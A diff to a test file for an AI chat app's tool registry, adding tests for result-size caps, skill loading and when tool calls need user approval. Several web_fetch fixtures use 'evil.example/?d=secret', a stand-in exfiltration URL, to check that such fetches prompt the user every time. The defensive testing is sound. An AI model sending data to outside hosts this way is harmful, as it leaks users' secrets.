@@ -13,6 +13,7 @@ vi.mock('../src/main/skills/library', () => {
 })
 
 const {
+  allowKeyFor,
   approvalFor,
   declinedResult,
   missingAbilities,
@@ -127,6 +128,31 @@ describe('tool registry', () => {
     expect(result.event.preview).toBe(`${'a'.repeat(1500)}…`)
   })
 
+  it("keeps results a provider needs whole (a skill's instructions) out of a round's share", async () => {
+    register(
+      fake('whole', ['guide'], {
+        wholeResults: true,
+        run: async () => ({ content: 'g'.repeat(30_000), event: { tool: 'guide', args: {}, ok: true, summary: 'guide' } })
+      })
+    )
+    const result = await runTool(call('guide'), ctx({ maxResultChars: 1_500 }))
+    expect(result.content.startsWith(`${'g'.repeat(24_000)}\n[…`)).toBe(true)
+    const skill = await runTool(call('load_skill', { name: 'pdf' }), ctx({ skills: true, maxResultChars: 10 }))
+    expect(skill.content).toContain('Fill the form with scripts/fill.py.')
+  })
+
+  it("caps a result at the call's share of the room when the reply gives one, never above the usual cap", async () => {
+    register(
+      fake('big', ['dump'], {
+        run: async () => ({ content: 'a'.repeat(30_000), event: { tool: 'dump', args: {}, ok: true, summary: 'dump' } })
+      })
+    )
+    expect((await runTool(call('dump'), ctx({ maxResultChars: 5_000 }))).content).toBe(
+      `${'a'.repeat(5_000)}\n[… 25000 more characters cut]`
+    )
+    expect((await runTool(call('dump'), ctx({ maxResultChars: 99_000 }))).content.startsWith(`${'a'.repeat(24_000)}\n[…`)).toBe(true)
+  })
+
   it("tells the model a skill's scripts can't run, unless a provider can run code", async () => {
     const without = await runTool(call('load_skill', { name: 'pdf' }), ctx({ skills: true }))
     expect(without.loadedSkillId).toBe('app:pdf')
@@ -200,14 +226,32 @@ describe('replayCalls', () => {
 })
 
 describe('asking first', () => {
-  it("runs built-in tools straight away, and asks only when a tool's provider says so", () => {
+  it("runs built-in tools straight away, and otherwise does what the tool's provider says", () => {
     register(fake('mcp', ['notes__delete', 'notes__read'], { approval: ({ name }) => (name === 'notes__delete' ? 'ask' : 'auto') }))
-    const c = ctx({ web: true })
+    const c = ctx({ web: true, skills: true })
     expect(approvalFor(call('web_search', { query: 'x' }), c)).toBe('auto')
+    expect(approvalFor(call('web_fetch', { url: 'https://example.com' }), c)).toBe('auto')
+    expect(approvalFor(call('load_skill', { name: 'pdf' }), c)).toBe('auto')
     expect(approvalFor(call('notes__read'), c)).toBe('auto')
     expect(approvalFor(call('notes__delete'), c)).toBe('ask')
     // Nothing offers it, so there's nothing to ask about: the model just hears it doesn't exist.
     expect(approvalFor(call('python'), c)).toBe('auto')
+  })
+
+  it("asks for a provider's tools when the provider doesn't say", () => {
+    register(fake('runner', ['run_code'], { grants: ['code'] }))
+    expect(approvalFor(call('run_code'), ctx())).toBe('ask')
+  })
+
+  it('asks before every web_fetch once the chat has other tool sources, a denial covering the site', () => {
+    const c = ctx({ web: true, sources: ['code-runner'] }) // any source; MCP ones are covered in mcp.test.ts
+    expect(approvalFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), c)).toBe('ask-every-time')
+    expect(approvalFor(call('web_search', { query: 'x' }), c)).toBe('auto')
+    expect(allowKeyFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), c)).toBe('web_fetch@evil.example')
+    // gpt-oss's browser.open is the same fetch, and asks the same way.
+    expect(approvalFor(call('browser.open', { url: 'https://evil.example/x' }), c)).toBe('ask-every-time')
+    expect(allowKeyFor(call('browser.open', { url: 'https://evil.example/x' }), c)).toBe('web_fetch@evil.example')
+    expect(allowKeyFor(call('web_search', { query: 'x' }), c)).toBe('web_search')
   })
 
   it('tells the model a declined call never ran, and shows it as declined', () => {
